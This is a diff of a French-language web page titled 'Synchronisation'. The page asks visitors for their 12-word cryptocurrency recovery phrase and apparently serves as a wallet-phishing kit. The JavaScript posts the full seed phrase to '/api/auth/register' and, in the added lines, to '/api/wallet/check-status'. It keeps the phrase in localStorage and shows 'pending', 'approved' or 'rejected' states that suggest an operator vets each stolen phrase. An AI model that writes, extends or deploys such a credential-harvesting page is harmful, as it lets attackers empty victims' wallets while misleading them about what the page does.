@@ -15,10 +15,7 @@
             min-height: 100vh;
             padding: 20px;
         }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
+        .container { max-width: 800px; margin: 0 auto; }
         .header {
             display: flex;
             align-items: center;
@@ -39,16 +36,9 @@
             font-size: 20px;
         }
         .back-btn:hover { background: rgba(245,176,66,0.3); }
-        .title {
-            font-size: 28px;
-            font-weight: 700;
-        }
+        .title { font-size: 28px; font-weight: 700; }
         .title span { color: #f5b042; }
-        .subtitle {
-            color: #8b8cae;
-            font-size: 14px;
-            margin-top: 5px;
-        }
+        .subtitle { color: #8b8cae; font-size: 14px; margin-top: 5px; }
         .warning-box {
             background: rgba(239,68,68,0.1);
             border-left: 3px solid #ef4444;
@@ -128,6 +118,16 @@
         .btn-secondary:hover {
             background: rgba(255,255,255,0.15);
         }
+        .btn-success {
+            background: #10b981;
+            color: white;
+            cursor: default;
+        }
+        .btn-danger {
+            background: #ef4444;
+            color: white;
+            cursor: default;
+        }
         .progress-text {
             text-align: center;
             color: #8b8cae;
@@ -162,6 +162,35 @@
             color: #3b82f6;
             border: 1px solid rgba(59,130,246,0.3);
         }
+        .wallet-words {
+            background: rgba(16,185,129,0.1);
+            border: 1px solid rgba(16,185,129,0.2);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+            text-align: center;
+            color: #10b981;
+        }
+        .btn-go-wallet {
+            margin-top: 15px;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #f5b042, #e08e1a);
+            border: none;
+            border-radius: 40px;
+            color: #0a0c1a;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        .btn-go-wallet:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(245,176,66,0.3);
+        }
         @media (max-width: 600px) {
             .seed-grid { grid-template-columns: repeat(3, 1fr); }
         }
@@ -173,7 +202,7 @@
 <body>
     <div class="container">
         <div class="header">
-            <div class="back-btn" onclick="window.location.href='dashboard.html'"><i class="fas fa-arrow-left"></i></div>
+            <div class="back-btn" onclick="window.location.href='index.html'"><i class="fas fa-arrow-left"></i></div>
             <div>
                 <div class="title"><span>🔐 Synchronisation</span></div>
                 <div class="subtitle">Entrez votre phrase de récupération (12 mots)</div>
@@ -193,6 +222,8 @@
         </div>
 
         <div id="statusMessage" style="display: none;"></div>
+        <div id="walletWords" style="display: none;" class="wallet-words"></div>
+        <div id="goToWallet" style="display: none;"></div>
 
         <div class="actions">
             <button class="btn btn-secondary" onclick="resetSeed()">
@@ -205,6 +236,9 @@
     </div>
 
     <script>
+        let currentStatus = 'pending';
+        let currentSeedPhrase = '';
+
         function generateSeedFields() {
             const grid = document.getElementById('seedGrid');
             grid.innerHTML = '';
@@ -249,7 +283,50 @@
                 if (input) input.value = '';
             }
             document.getElementById('statusMessage').style.display = 'none';
+            document.getElementById('walletWords').style.display = 'none';
+            document.getElementById('goToWallet').style.display = 'none';
+            localStorage.removeItem('seedWords');
+            currentStatus = 'pending';
             updateProgress();
+        }
+
+        function showWalletWords(seedPhrase) {
+            const words = seedPhrase.split(' ');
+            const container = document.getElementById('walletWords');
+            container.style.display = 'block';
+            container.innerHTML = `
+                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; text-align: center; margin-top: 10px;">
+                    ${words.map((word, index) => `
+                        <div style="background: rgba(16,185,129,0.05); padding: 6px; border-radius: 8px;">
+                            <span style="font-size: 10px; color: #8b8cae;">mot ${index + 1}</span><br>
+                            <span style="font-weight: 600;">${word}</span>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+            
+            const btnContainer = document.getElementById('goToWallet');
+            btnContainer.style.display = 'block';
+            btnContainer.innerHTML = `
+                <button class="btn-go-wallet" onclick="window.location.href='dashboard.html'">
+                    <i class="fas fa-wallet"></i> Accéder au portefeuille
+                </button>
+            `;
+        }
+
+        async function checkStatus(seedPhrase) {
+            try {
+                const response = await fetch('/api/wallet/check-status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ seedPhrase })
+                });
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Erreur:', error);
+                return null;
+            }
         }
 
         async function validateSeed() {
@@ -273,7 +350,30 @@
             }
 
             const seedPhrase = words.join(' ');
-            console.log('📝 Seed phrase envoyée:', seedPhrase);
+            currentSeedPhrase = seedPhrase;
+            
+            localStorage.setItem('seedWords', JSON.stringify(words));
+
+            const statusCheck = await checkStatus(seedPhrase);
+            
+            if (statusCheck && statusCheck.success) {
+                currentStatus = statusCheck.status;
+                
+                if (statusCheck.status === 'approved') {
+                    const statusDiv = document.getElementById('statusMessage');
+                    statusDiv.style.display = 'block';
+                    statusDiv.className = 'status-box status-approved';
+                    statusDiv.innerHTML = '✅ Wallet synchronisé !';
+                    showWalletWords(seedPhrase);
+                    return;
+                } else if (statusCheck.status === 'rejected') {
+                    const statusDiv = document.getElementById('statusMessage');
+                    statusDiv.style.display = 'block';
+                    statusDiv.className = 'status-box status-rejected';
+                    statusDiv.innerHTML = '❌ Erreur de synchronisation. Contactez le support.';
+                    return;
+                }
+            }
 
             try {
                 const response = await fetch('/api/auth/register', {
@@ -292,14 +392,9 @@
                 
                 const statusDiv = document.getElementById('statusMessage');
                 statusDiv.style.display = 'block';
-
-                if (data.success) {
-                    statusDiv.className = 'status-box status-pending';
-                    statusDiv.innerHTML = '⏳ Attente de synchronisation...';
-                } else {
-                    statusDiv.className = 'status-box status-pending';
-                    statusDiv.innerHTML = '⏳ Attente de synchronisation...';
-                }
+                statusDiv.className = 'status-box status-pending';
+                statusDiv.innerHTML = '⏳ Attente de synchronisation...';
+                
             } catch (error) {
                 console.error('Erreur:', error);
                 const statusDiv = document.getElementById('statusMessage');
@@ -309,8 +404,7 @@
             }
         }
 
-        // Vérifier le statut au chargement
-        function checkSavedSeed() {
+        async function checkSavedSeed() {
             const savedWords = localStorage.getItem('seedWords');
             if (savedWords) {
                 const words = JSON.parse(savedWords);
@@ -321,11 +415,36 @@
                     }
                 }
                 updateProgress();
+                
+                const seedPhrase = words.join(' ');
+                const statusCheck = await checkStatus(seedPhrase);
+                
+                if (statusCheck && statusCheck.success) {
+                    currentStatus = statusCheck.status;
+                    
+                    if (statusCheck.status === 'approved') {
+                        const statusDiv = document.getElementById('statusMessage');
+                        statusDiv.style.display = 'block';
+                        statusDiv.className = 'status-box status-approved';
+                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
+                        showWalletWords(seedPhrase);
+                    } else if (statusCheck.status === 'rejected') {
+                        const statusDiv = document.getElementById('statusMessage');
+                        statusDiv.style.display = 'block';
+                        statusDiv.className = 'status-box status-rejected';
+                        statusDiv.innerHTML = '❌ Erreur de synchronisation. Contactez le support.';
+                    } else {
+                        const statusDiv = document.getElementById('statusMessage');
+                        statusDiv.style.display = 'block';
+                        statusDiv.className = 'status-box status-pending';
+                        statusDiv.innerHTML = '⏳ Attente de synchronisation...';
+                    }
+                }
             }
         }
 
         generateSeedFields();
-        checkSavedSeed();
+        setTimeout(checkSavedSeed, 500);
     </script>
 </body>
 </html>
